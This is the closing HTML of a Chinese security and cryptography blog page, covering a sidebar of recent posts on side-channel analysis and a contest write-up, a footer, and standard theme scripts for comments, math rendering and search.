href="#%E7%A9%BA%E6%A0%BC%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="toc-number">3.1.</span> <span class="toc-text">空格被过滤</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/archives/e366993f.html" title="文献阅读笔记-AutoPOI: automated points of interest selection for side-channel analysis">文献阅读笔记-AutoPOI: automated points of interest selection for side-channel analysis</a><time datetime="2024-10-16T00:40:42.000Z" title="发表于 2024-10-16 08:40:42">2024-10-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/archives/e366992f.html" title="文献阅读笔记-Exploring Feature Selection Scenarios for Deep Learning-based Side-channel Analysis">文献阅读笔记-Exploring Feature Selection Scenarios for Deep Learning-based Side-channel Analysis</a><time datetime="2024-10-12T00:24:46.000Z" title="发表于 2024-10-12 08:24:46">2024-10-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/archives/b67151df.html" title="第九届密码学竞赛-赛题三WP">第九届密码学竞赛-赛题三WP</a><time datetime="2024-08-26T03:26:11.000Z" title="发表于 2024-08-26 11:26:11">2024-08-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/archives/e8b8df3e.html" title="换服务器啦！">换服务器啦！</a><time datetime="2024-07-23T15:50:58.000Z" title="发表于 2024-07-23 23:50:58">2024-07-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/14e98e24.html" title="文献阅读笔记-Peek into the Black-Box:Interpretable Neural Network using SAT Equations in Side-Channel Analysis"><img src="/../img/image-20240606094606014.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="文献阅读笔记-Peek into the Black-Box:Interpretable Neural Network using SAT Equations in Side-Channel Analysis"/></a><div class="content"><a class="title" href="/archives/14e98e24.html" title="文献阅读笔记-Peek into the Black-Box:Interpretable Neural Network using SAT Equations in Side-Channel Analysis">文献阅读笔记-Peek into the Black-Box:Interpretable Neural Network using SAT Equations in Side-Channel Analysis</a><time datetime="2024-06-06T01:44:51.000Z" title="发表于 2024-06-06 09:44:51">2024-06-06</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/default.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2024 By i4mhmh</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><a href="https://beian.miit.gov.cn/" target="_blank"> <img src='/img/ba.png'> 豫ICP备2022016623号</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/copy-tex.min.js"></script><script>(() => {
+  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
+    btf.wrap(item, 'div', { class: 'katex-wrap'})
+  })
+})()</script><script>(() => {
+  const loadUtterances = () => {
+    let ele = document.createElement('script')
+    ele.id = 'utterances_comment'
+    ele.src = 'https://utteranc.es/client.js'
+    ele.setAttribute('repo', 'i4mhmh/i4mhmh.github.io')
+    ele.setAttribute('issue-term', 'pathname')
+    const nowTheme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'photon-dark' : 'github-light'
+    ele.setAttribute('theme', nowTheme)
+    ele.crossOrigin = 'anonymous'
+    ele.async = true
+    document.getElementById('utterances-wrap').appendChild(ele)
+  }
+
+  const utterancesTheme = theme => {
+    const iframe = document.querySelector('.utterances-frame')
+    if (iframe) {
+      const theme = theme === 'dark' ? 'photon-dark' : 'github-light'
+      const message = {
+        type: 'set-theme',
+        theme: theme
+      };
+      iframe.contentWindow.postMessage(message, 'https://utteranc.es');
+    }
+  }
+
+  btf.addGlobalFn('themeChange', utterancesTheme, 'utterances')
+
+  if ('Utterances' === 'Utterances' || !false) {
+    if (false) btf.loadComment(document.getElementById('utterances-wrap'), loadUtterances)
+    else loadUtterances()
+  } else {
+    window.loadOtherComment = loadUtterances
+  }
+})()</script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>
